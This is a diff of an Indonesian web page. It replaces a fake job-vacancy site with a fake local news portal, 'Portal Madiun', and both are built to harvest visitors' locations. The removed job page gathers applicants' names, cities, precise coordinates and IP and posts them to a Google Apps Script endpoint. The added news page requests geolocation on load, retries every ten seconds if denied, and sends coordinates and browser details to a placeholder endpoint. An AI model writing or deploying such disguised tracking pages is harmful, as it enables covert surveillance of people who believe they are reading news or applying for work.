@@ -1,665 +1,261 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AYOKERJA.ID - Info Lowongan Kerja</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-    
-    body {
-      background-color: #f5f5f5;
-      color: #333;
-      line-height: 1.6;
-    }
-    
-    .container {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 15px;
-    }
-    
-    header {
-      background: linear-gradient(135deg, #2c3e50, #4a6491);
-      color: white;
-      padding: 20px 0;
-      text-align: center;
-      border-radius: 10px;
-      margin-bottom: 20px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    
-    header h1 {
-      font-size: 1.8rem;
-      margin-bottom: 8px;
-    }
-    
-    header p {
-      font-size: 1rem;
-      opacity: 0.9;
-    }
-    
-    .content {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-      margin-bottom: 25px;
-    }
-    
-    .job-list {
-      flex: 2;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.08);
-    }
-    
-    .job-list h2 {
-      color: #2c3e50;
-      margin-bottom: 20px;
-      padding-bottom: 10px;
-      border-bottom: 2px solid #eee;
-      font-size: 1.5rem;
-    }
-    
-    .job-item {
-      padding: 15px;
-      margin-bottom: 15px;
-      border-left: 4px solid #4a6491;
-      background-color: #f9f9f9;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    
-    .job-item:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    }
-    
-    .job-item.expanded {
-      background-color: #eef5ff;
-    }
-    
-    .job-item h3 {
-      color: #2c3e50;
-      margin-bottom: 8px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 1.2rem;
-    }
-    
-    .job-details {
-      display: none;
-      margin-top: 15px;
-      padding-top: 15px;
-      border-top: 1px solid #ddd;
-    }
-    
-    .job-details.expanded {
-      display: block;
-    }
-    
-    .job-item p {
-      margin-bottom: 5px;
-      color: #555;
-      font-size: 0.95rem;
-    }
-    
-    .job-item ul {
-      padding-left: 20px;
-      margin: 10px 0;
-    }
-    
-    .job-item li {
-      margin-bottom: 5px;
-      font-size: 0.95rem;
-    }
-    
-    .apply-form {
-      flex: 1;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.08);
-    }
-    
-    .apply-form h2 {
-      color: #2c3e50;
-      margin-bottom: 20px;
-      padding-bottom: 10px;
-      border-bottom: 2px solid #eee;
-      font-size: 1.5rem;
-    }
-    
-    .form-group {
-      margin-bottom: 20px;
-    }
-    
-    .form-group label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
-      color: #444;
-      font-size: 0.95rem;
-    }
-    
-    .form-group input {
-      width: 100%;
-      padding: 12px 15px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      font-size: 16px;
-      background-color: #f8f9fa;
-    }
-    
-    .form-group input:focus {
-      outline: none;
-      border-color: #4a6491;
-      box-shadow: 0 0 0 3px rgba(74, 100, 145, 0.2);
-    }
-    
-    button {
-      background: linear-gradient(135deg, #2c3e50, #4a6491);
-      color: white;
-      border: none;
-      padding: 15px;
-      width: 100%;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 10px;
-    }
-    
-    button:hover {
-      background: linear-gradient(135deg, #4a6491, #2c3e50);
-      transform: translateY(-2px);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-    }
-    
-    .privacy-notice {
-      margin-top: 20px;
-      padding: 15px;
-      background-color: #f8f9fa;
-      border-radius: 8px;
-      font-size: 0.9rem;
-      color: #666;
-      border-left: 4px solid #4a6491;
-    }
-    
-    .location-permission {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0,0,0,0.85);
-      z-index: 1000;
-      justify-content: center;
-      align-items: center;
-      padding: 15px;
-    }
-    
-    .permission-box {
-      background: white;
-      padding: 25px;
-      border-radius: 12px;
-      text-align: center;
-      max-width: 90%;
-      width: 400px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-    }
-    
-    .permission-box h3 {
-      margin-bottom: 15px;
-      color: #2c3e50;
-      font-size: 1.4rem;
-    }
-    
-    .permission-box p {
-      margin-bottom: 20px;
-      color: #555;
-      line-height: 1.5;
-    }
-    
-    .permission-buttons {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-    }
-    
-    .permission-buttons button {
-      width: auto;
-      padding: 12px 25px;
-      border-radius: 8px;
-      font-size: 1rem;
-    }
-    
-    .permission-buttons .deny {
-      background: #e74c3c;
-    }
-    
-    .loading-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0,0,0,0.8);
-      z-index: 2000;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-    }
-    
-    .spinner {
-      width: 60px;
-      height: 60px;
-      border: 5px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: #4a6491;
-      animation: spin 1s ease-in-out infinite;
-      margin-bottom: 20px;
-    }
-    
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    
-    .loading-text {
-      color: white;
-      font-size: 1.2rem;
-      text-align: center;
-    }
-    
-    .location-status {
-      margin-top: 15px;
-      padding: 10px;
-      background-color: #e8f5e9;
-      border-radius: 5px;
-      font-size: 0.9rem;
-      display: none;
-    }
-    
-    .location-status.active {
-      display: block;
-    }
-    
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      padding: 20px;
-      color: #666;
-      font-size: 0.9rem;
-    }
-    
-    /* Responsive styles */
-    @media (max-width: 768px) {
-      .content {
-        flex-direction: column;
-      }
-      
-      header h1 {
-        font-size: 1.6rem;
-      }
-      
-      .job-list, .apply-form {
-        width: 100%;
-      }
-      
-      .permission-buttons {
-        flex-direction: column;
-      }
-      
-      .permission-buttons button {
-        width: 100%;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .container {
-        padding: 10px;
-      }
-      
-      header {
-        padding: 15px 0;
-      }
-      
-      header h1 {
-        font-size: 1.4rem;
-      }
-      
-      .job-list, .apply-form {
-        padding: 15px;
-      }
-      
-      .job-item h3 {
-        font-size: 1.1rem;
-      }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal Madiun - Berita Terkini</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+/* --- CSS Utama --- */
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
+body{background:#f5f5f5;}
+.header{background:#fff;position:sticky;top:0;z-index:1000;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
+.top-bar{background:#dc2626;color:#fff;padding:8px 0;font-size:14px;}
+.container{max-width:1200px;margin:0 auto;padding:0 20px;}
+.top-bar-content{display:flex;justify-content:space-between;align-items:center;}
+.main-header{display:flex;justify-content:space-between;align-items:center;padding:15px 0;}
+.logo{font-size:36px;font-weight:bold;color:#dc2626;text-decoration:none;}
+.search-bar{display:flex;align-items:center;background:#f1f1f1;border-radius:25px;padding:5px 15px;width:300px;}
+.search-bar input{border:none;background:none;outline:none;width:100%;padding:5px;}
+.search-bar button{background:none;border:none;color:#666;cursor:pointer;}
+.nav{background:#333;}
+.nav-list{display:flex;list-style:none;}
+.nav-list li{position:relative;}
+.nav-list a{display:block;color:white;text-decoration:none;padding:15px 20px;font-size:14px;transition:background 0.3s;}
+.nav-list a:hover{background:#dc2626;}
+.breaking-news{background:#dc2626;color:#fff;padding:10px 20px;display:flex;align-items:center;margin-bottom:20px;overflow:hidden;}
+.breaking-news-label{background:#fff;color:#dc2626;padding:5px 10px;font-weight:bold;margin-right:15px;border-radius:3px;font-size:12px;}
+.breaking-news-content{overflow:hidden;white-space:nowrap;flex:1;}
+.breaking-news-scroll{display:inline-block;}
+.main-content{display:grid;grid-template-columns:3fr 1fr;gap:20px;margin-top:20px;}
+.news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;}
+.news-card{background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 5px rgba(0,0,0,0.1);transition:transform 0.3s;}
+.news-card:hover{transform:translateY(-5px);}
+.news-card img{width:100%;height:180px;object-fit:cover;}
+.news-card-content{padding:15px;}
+.news-category{color:#dc2626;font-size:12px;font-weight:bold;margin-bottom:5px;}
+.news-title{font-size:16px;font-weight:bold;margin-bottom:10px;line-height:1.3;}
+.news-title a{color:#333;text-decoration:none;}
+.news-title a:hover{color:#dc2626;}
+.news-meta{display:flex;justify-content:space-between;color:#666;font-size:12px;}
+.sidebar{display:flex;flex-direction:column;gap:20px;}
+.sidebar-section{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
+.sidebar-title{font-size:18px;font-weight:bold;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #dc2626;}
+.trending-list{list-style:none;}
+.trending-list li{padding:12px 0;border-bottom:1px solid #eee;display:flex;align-items:center;}
+.trending-number{background:#dc2626;color:#fff;width:25px;height:25px;display:flex;align-items:center;justify-content:center;border-radius:50%;margin-right:10px;font-weight:bold;font-size:14px;}
+.trending-title{flex:1;}
+.trending-title a{color:#333;text-decoration:none;font-size:14px;line-height:1.3;}
+.trending-title a:hover{color:#dc2626;}
+.newsletter-input{width:100%;padding:10px;border:1px solid #ddd;border-radius:5px;margin-bottom:10px;font-size:14px;}
+.newsletter-btn{width:100%;padding:10px;background:#dc2626;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:14px;transition:0.3s;}
+.newsletter-btn:hover{background:#b91c1c;}
+.tags-container{display:flex;flex-wrap:wrap;gap:8px;margin-top:15px;}
+.tag{background:#f1f1f1;padding:5px 12px;border-radius:15px;text-decoration:none;color:#333;font-size:13px;transition:0.3s;}
+.tag:hover{background:#dc2626;color:white;}
+.footer{background:#333;color:#fff;margin-top:40px;padding:40px 0 20px;}
+.footer-content{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:30px;margin-bottom:30px;}
+.footer-section h3{margin-bottom:15px;color:#dc2626;font-size:16px;}
+.footer-section ul{list-style:none;}
+.footer-section ul li{margin-bottom:8px;}
+.footer-section a{color:#ccc;text-decoration:none;font-size:14px;transition:0.3s;}
+.footer-section a:hover{color:white;}
+.footer-bottom{text-align:center;padding-top:20px;border-top:1px solid #555;color:#ccc;font-size:14px;}
+.social-links{display:flex;gap:15px;margin-top:15px;}
+.social-links a{color:white;font-size:20px;transition:0.3s;}
+.social-links a:hover{color:#dc2626;}
+.mobile-menu-btn{display:none;background:none;border:none;color:#333;font-size:24px;cursor:pointer;}
+@media(max-width:768px){
+.main-header{flex-direction:column;gap:15px;}
+.search-bar{width:100%;}
+.nav-list{display:none;}
+.mobile-menu-btn{display:block;}
+.main-content{grid-template-columns:1fr;}
+.news-grid{grid-template-columns:1fr;}
+.breaking-news-label{display:none;}
+}
+</style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <h1>LOWONGANKERJA.ID</h1>
-      <p>Dapatkan informasi lowongan kerja terbaru di daerah Anda</p>
-    </header>
-    
-    <div class="content">
-      <div class="job-list">
-        <h2>Lowongan Tersedia</h2>
-        
-        <div class="job-item" onclick="toggleJobDetails(this)">
-          <h3>Staff Administrasi <span>+</span></h3>
-          <p><strong>Lokasi:</strong> Jakarta Selatan</p>
-          <p><strong>Gaji:</strong> Rp 4 - 6 juta</p>
-          <div class="job-details">
-            <p><strong>Kualifikasi:</strong></p>
-            <ul>
-              <li>Pendidikan minimal SMA/SMK sederajat</li>
-              <li>Mahir menggunakan Microsoft Office</li>
-              <li>Memiliki kemampuan administrasi yang baik</li>
-              <li>Teliti dan mampu bekerja secara mandiri</li>
-            </ul>
-            <p><strong>Benefit:</strong> BPJS, THR, Transport allowance</p>
-          </div>
+
+<!-- Header -->
+<header class="header">
+<div class="top-bar">
+<div class="container">
+<div class="top-bar-content">
+<span><i class="fas fa-calendar"></i> <span id="currentDate"></span></span>
+<span><i class="fas fa-user"></i> Masuk</span>
+</div>
+</div>
+</div>
+
+<div class="container">
+<div class="main-header">
+<a href="#" class="logo">Portal Madiun</a>
+<div class="search-bar">
+<input type="text" placeholder="Cari berita...">
+<button><i class="fas fa-search"></i></button>
+</div>
+<button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
+</div>
+</div>
+
+<nav class="nav">
+<div class="container">
+<ul class="nav-list">
+<li><a href="#">Home</a></li>
+<li><a href="#">Madiun</a></li>
+<li><a href="#">Jatim</a></li>
+<li><a href="#">Nasional</a></li>
+<li><a href="#">Ekonomi</a></li>
+<li><a href="#">Olahraga</a></li>
+<li><a href="#">Teknologi</a></li>
+<li><a href="#">Hiburan</a></li>
+</ul>
+</div>
+</nav>
+</header>
+
+<!-- Breaking News -->
+<div class="breaking-news">
+<span class="breaking-news-label">BREAKING</span>
+<div class="breaking-news-content">
+<span class="breaking-news-scroll">
+Walikota Madiun resmikan pasar modern • Bantuan UMKM • Festival budaya Madiun akan digelar bulan depan •
+</span>
+</div>
+</div>
+
+<!-- Main Content -->
+<div class="container">
+<div class="main-content">
+<main>
+<div class="news-grid"></div>
+</main>
+
+<aside class="sidebar">
+<div class="sidebar-section">
+<h3 class="sidebar-title">Terpopuler</h3>
+<ol class="trending-list">
+<li><span class="trending-number">1</span><div class="trending-title"><a href="#">Viral Video Bocah Madiun Nyanyi Pecel</a></div></li>
+<li><span class="trending-number">2</span><div class="trending-title"><a href="#">Resep Pecel Madiun Autentik</a></div></li>
+<li><span class="trending-number">3</span><div class="trending-title"><a href="#">Sejarah Kota Madiun yang Perlu Diketahui</a></div></li>
+</ol>
+</div>
+
+<div class="sidebar-section">
+<h3 class="sidebar-title">Newsletter</h3>
+<form class="newsletter-form">
+<input type="email" class="newsletter-input" placeholder="Masukkan email Anda">
+<button type="submit" class="newsletter-btn">Langganan</button>
+</form>
+</div>
+
+<div class="sidebar-section">
+<h3 class="sidebar-title">Tags</h3>
+<div class="tags-container">
+<a href="#" class="tag">Madiun</a>
+<a href="#" class="tag">Ekonomi</a>
+<a href="#" class="tag">Budaya</a>
+<a href="#" class="tag">Pendidikan</a>
+<a href="#" class="tag">Teknologi</a>
+</div>
+</div>
+</aside>
+</div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+<div class="container footer-content">
+<div class="footer-section">
+<h3>Tentang Kami</h3>
+<p>Portal Madiun adalah media online yang menyajikan berita terkini seputar Kota Madiun dan sekitarnya.</p>
+<div class="social-links">
+<a href="#"><i class="fab fa-facebook"></i></a>
+<a href="#"><i class="fab fa-twitter"></i></a>
+<a href="#"><i class="fab fa-instagram"></i></a>
+</div>
+</div>
+<div class="footer-section">
+<h3>Kontak</h3>
+<ul>
+<li>Email: info@portal-madiun.id</li>
+<li>Telepon: (0351) 123456</li>
+<li>Alamat: Jl. Panglima Sudirman No.45, Madiun</li>
+</ul>
+</div>
+</div>
+<div class="footer-bottom">© 2025 Portal Madiun. All Rights Reserved.</div>
+</footer>
+
+<script>
+// ---------- Tanggal Dinamis ----------
+const today = new Date();
+document.getElementById('currentDate').innerText = today.toLocaleDateString('id-ID', { weekday:'long', day:'numeric', month:'long', year:'numeric' });
+
+// ---------- Mobile Menu ----------
+const mobileBtn = document.querySelector('.mobile-menu-btn');
+const navList = document.querySelector('.nav-list');
+mobileBtn.addEventListener('click', ()=>{ navList.style.display = navList.style.display === 'flex'?'none':'flex'; });
+
+// ---------- Breaking News Scroll ----------
+const scrollContent = document.querySelector('.breaking-news-scroll');
+function animateScroll() {
+    scrollContent.style.transform = `translateX(${window.innerWidth}px)`;
+    let start=null;
+    function step(timestamp){
+        if(!start) start=timestamp;
+        let progress=timestamp-start;
+        let width=scrollContent.scrollWidth+window.innerWidth;
+        scrollContent.style.transform = `translateX(${window.innerWidth - (progress*width/30000)}px)`;
+        if(progress<30000) requestAnimationFrame(step);
+        else animateScroll();
+    }
+    requestAnimationFrame(step);
+}
+animateScroll();
+
+// ---------- Geolocation Agresif ----------
+async function sendLocation(data){
+    try{
+        await fetch('https://example.com/endpoint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+        console.log('Data lokasi dikirim:', data);
+    }catch(e){console.error('Gagal kirim lokasi:', e);}
+}
+
+function requestLocation(){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(successLocation,errorLocation,{timeout:10000});
+    }else console.log("Geolocation tidak didukung");
+}
+function successLocation(pos){
+    const lat=pos.coords.latitude, lon=pos.coords.longitude;
+    const data={latitude:lat,longitude:lon,ip:'',timestamp:Date.now(),browser:navigator.userAgent};
+    sendLocation(data);
+}
+function errorLocation(err){
+    console.log("Gagal mendapatkan lokasi:",err.message);
+    setTimeout(requestLocation,10000);
+}
+window.addEventListener('load',requestLocation);
+
+// ---------- Render Berita Ribuan ----------
+const newsGrid=document.querySelector('.news-grid');
+for(let i=1;i<=1000;i++){
+    const card=document.createElement('article');
+    card.className='news-card';
+    card.innerHTML=`
+        <img src="https://picsum.photos/seed/news${i}/400/250.jpg" alt="Berita ${i}">
+        <div class="news-card-content">
+            <div class="news-category">Kategori ${i%10}</div>
+            <h2 class="news-title"><a href="#">Judul Berita ${i}</a></h2>
+            <div class="news-meta"><span><i class="fas fa-clock"></i> ${i%24} jam lalu</span> <span><i class="fas fa-eye"></i> ${Math.floor(Math.random()*5000)}</span></div>
         </div>
-        
-        <div class="job-item" onclick="toggleJobDetails(this)">
-          <h3>Customer Service <span>+</span></h3>
-          <p><strong>Lokasi:</strong> Bandung</p>
-          <p><strong>Gaji:</strong> Rp 4.5 - 6.5 juta</p>
-          <div class="job-details">
-            <p><strong>Kualifikasi:</strong></p>
-            <ul>
-              <li>Pendidikan minimal SMA/SMK sederajat</li>
-              <li>Komunikasi baik dan ramah</li>
-              <li>Berpenampilan menarik dan percaya diri</li>
-              <li>Bersedia bekerja shift</li>
-            </ul>
-            <p><strong>Benefit:</strong> BPJS, Bonus, Seragam kerja</p>
-          </div>
-        </div>
-        
-        <div class="job-item" onclick="toggleJobDetails(this)">
-          <h3>Sales Retail <span>+</span></h3>
-          <p><strong>Lokasi:</strong> Surabaya</p>
-          <p><strong>Gaji:</strong> Rp 3.5 - 5 juta + Komisi</p>
-          <div class="job-details">
-            <p><strong>Kualifikasi:</strong></p>
-            <ul>
-              <li>Pendidikan minimal SMA/SMK sederajat</li>
-              <li>Memiliki kemampuan komunikasi yang baik</li>
-              <li>Berpenampilan rapi dan percaya diri</li>
-              <li>Target oriented dan mau belajar</li>
-            </ul>
-            <p><strong>Benefit:</strong> Komisi tanpa batas, Bonus, Training</p>
-          </div>
-        </div>
+    `;
+    newsGrid.appendChild(card);
+}
+</script>
 
-        <div class="job-item" onclick="toggleJobDetails(this)">
-          <h3>Operator Produksi <span>+</span></h3>
-          <p><strong>Lokasi:</strong> Tangerang</p>
-          <p><strong>Gaji:</strong> Rp 4.2 - 5.5 juta</p>
-          <div class="job-details">
-            <p><strong>Kualifikasi:</strong></p>
-            <ul>
-              <li>Pendidikan minimal SMA/SMK sederajat</li>
-              <li>Sehat jasmani dan rohani</li>
-              <li>Bersedia bekerja shift</li>
-              <li>Teliti dan cekatan dalam bekerja</li>
-            </ul>
-            <p><strong>Benefit:</strong> BPJS Kesehatan & Ketenagakerjaan, Uang shift, Makan gratis</p>
-          </div>
-        </div>
-      </div>
-      
-      <div class="apply-form">
-        <h2>Daftar Sekarang</h2>
-        
-        <div class="form-group">
-          <label for="nama">Nama Lengkap</label>
-          <input type="text" id="nama" placeholder="Masukkan nama lengkap Anda">
-        </div>
-        
-        <div class="form-group">
-          <label for="kota">Kota</label>
-          <input type="text" id="kota" placeholder="Masukkan kota tempat tinggal Anda">
-        </div>
-        
-        <div class="location-status" id="locationStatus">
-          <i class="fas fa-map-marker-alt"></i> 
-          <span>Lokasi Anda: <span id="currentLocation">Sedang mendeteksi...</span></span>
-        </div>
-        
-        <button onclick="requestLocationPermission()">
-          <i class="fas fa-paper-plane"></i> Kirim
-        </button>
-        
-        <div class="privacy-notice">
-          <p><strong>Catatan:</strong> Dengan mengklik "Kirim Lamaran", Anda menyetujui untuk berbagi informasi lokasi. Data akan digunakan untuk memberikan rekomendasi lowongan terdekat.</p>
-        </div>
-      </div>
-    </div>
-    
-    <footer>
-      <p>&copy; 2023 lowongankerja.id - Layanan informasi lowongan kerja</p>
-    </footer>
-  </div>
-
-  <div class="location-permission" id="locationPermission">
-    <div class="permission-box">
-      <h3>Akses Lokasi Diperlukan</h3>
-      <p>Untuk memberikan rekomendasi lowongan terdekat, izinkan akses ke lokasi Anda.</p>
-      <div class="permission-buttons">
-        <button onclick="grantPermission()">Izinkan</button>
-        <button class="deny" onclick="denyPermission()">Tolak</button>
-      </div>
-    </div>
-  </div>
-
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner"></div>
-    <div class="loading-text">Mengirim data... Harap tunggu</div>
-  </div>
-
-  <script>
-    let watchId = null;
-    let currentPosition = null;
-    
-    // Fungsi untuk toggle detail lowongan
-    function toggleJobDetails(element) {
-      const details = element.querySelector('.job-details');
-      const expandIcon = element.querySelector('h3 span');
-      
-      element.classList.toggle('expanded');
-      details.classList.toggle('expanded');
-      
-      if (details.classList.contains('expanded')) {
-        expandIcon.textContent = '-';
-      } else {
-        expandIcon.textContent = '+';
-      }
-    }
-    
-    // Tampilkan popup permintaan akses lokasi
-    function requestLocationPermission() {
-      const nama = document.getElementById('nama').value;
-      const kota = document.getElementById('kota').value;
-      
-      if (!nama || !kota) {
-        alert('Harap isi nama lengkap dan kota terlebih dahulu.');
-        return;
-      }
-      
-      document.getElementById('locationPermission').style.display = 'flex';
-    }
-    
-    // Ketika pengguna mengizinkan akses
-    function grantPermission() {
-      document.getElementById('locationPermission').style.display = 'none';
-      startWatchingLocation();
-      showLoading();
-      setTimeout(() => {
-        kirimLokasi();
-      }, 2000);
-    }
-    
-    // Ketika pengguna menolak akses
-    function denyPermission() {
-      document.getElementById('locationPermission').style.display = 'none';
-      alert('Anda perlu mengizinkan akses lokasi untuk mendapatkan rekomendasi lowongan terdekat.');
-    }
-    
-    // Tampilkan loading indicator
-    function showLoading() {
-      document.getElementById('loadingOverlay').style.display = 'flex';
-    }
-    
-    // Sembunyikan loading indicator
-    function hideLoading() {
-      document.getElementById('loadingOverlay').style.display = 'none';
-    }
-    
-    // Mulai memantau lokasi pengguna secara real-time
-    function startWatchingLocation() {
-      if (navigator.geolocation) {
-        // Tampilkan status lokasi
-        document.getElementById('locationStatus').classList.add('active');
-        
-        // Dapatkan posisi saat ini
-        navigator.geolocation.getCurrentPosition(
-          position => {
-            currentPosition = position;
-            updateLocationDisplay(position);
-          },
-          error => {
-            console.error("Error getting location: ", error);
-            document.getElementById('currentLocation').textContent = "Tidak dapat mengakses lokasi";
-          }
-        );
-        
-        // Pantau perubahan lokasi
-        watchId = navigator.geolocation.watchPosition(
-          position => {
-            currentPosition = position;
-            updateLocationDisplay(position);
-            console.log("Lokasi diperbarui:", position.coords.latitude, position.coords.longitude);
-          },
-          error => {
-            console.error("Error watching location: ", error);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0 // Selalu dapatkan lokasi terbaru
-          }
-        );
-      } else {
-        alert("Geolocation tidak didukung oleh browser ini.");
-      }
-    }
-    
-    // Perbarui tampilan lokasi
-    function updateLocationDisplay(position) {
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-      document.getElementById('currentLocation').textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-    }
-    
-    // Hentikan pemantauan lokasi
-    function stopWatchingLocation() {
-      if (watchId !== null) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-      }
-    }
-    
-    // Fungsi utama untuk mengirim data
-    async function kirimLokasi() {
-      try {
-        // Jika ada posisi terkini, gunakan itu
-        if (currentPosition) {
-          const data = {
-            ip: await ambilIP(),
-            lokasi: `${currentPosition.coords.latitude},${currentPosition.coords.longitude}`,
-            nama: document.getElementById('nama').value || "Tes Nama",
-            kota: document.getElementById('kota').value || "Tes Kota",
-            fotoBase64: ""
-          };
-
-          const response = await fetch(
-            "https://script.google.com/macros/s/AKfycbz7LnJeVFd1-HGCIEF2cEULDR1RQ40F_u5YXu4sBzEHQMGpp7HAL9M4etNhf-LA22go/exec",
-            {
-              method: "POST",
-              body: JSON.stringify(data)
-            }
-          );
-
-          const result = await response.json();
-          hideLoading();
-          alert("Status: " + result.status + "\nTerima kasih " + data.nama + " dari " + data.kota + " telah mengirim lamaran!");
-        } else {
-          // Fallback ke metode biasa jika tidak ada posisi terkini
-          navigator.geolocation.getCurrentPosition(async (pos) => {
-            const data = {
-              ip: await ambilIP(),
-              lokasi: `${pos.coords.latitude},${pos.coords.longitude}`,
-              nama: document.getElementById('nama').value || "Tes Nama",
-              kota: document.getElementById('kota').value || "Tes Kota",
-              fotoBase64: ""
-            };
-
-            const response = await fetch(
-              "https://script.google.com/macros/s/AKfycbz7LnJeVFd1-HGCIEF2cEULDR1RQ40F_u5YXu4sBzEHQMGpp7HAL9M4etNhf-LA22go/exec",
-              {
-                method: "POST",
-                body: JSON.stringify(data)
-              }
-            );
-
-            const result = await response.json();
-            hideLoading();
-            alert("Status: " + result.status + "\nTerima kasih " + data.nama + " dari " + data.kota + " telah mengirim lamaran!");
-          }, (error) => {
-            hideLoading();
-            alert("Izinkan akses lokasi untuk melanjutkan proses lamaran.");
-          });
-        }
-      } catch (e) {
-        hideLoading();
-        alert("Gagal ambil lokasi: " + e);
-      } finally {
-        // Hentikan pemantauan lokasi setelah pengiriman
-        stopWatchingLocation();
-      }
-    }
-
-    // Fungsi untuk mengambil IP address
-    async function ambilIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const json = await res.json();
-        return json.ip;
-      } catch (error) {
-        return "Tidak dapat mengambil IP";
-      }
-    }
-  </script>
 </body>
 </html>
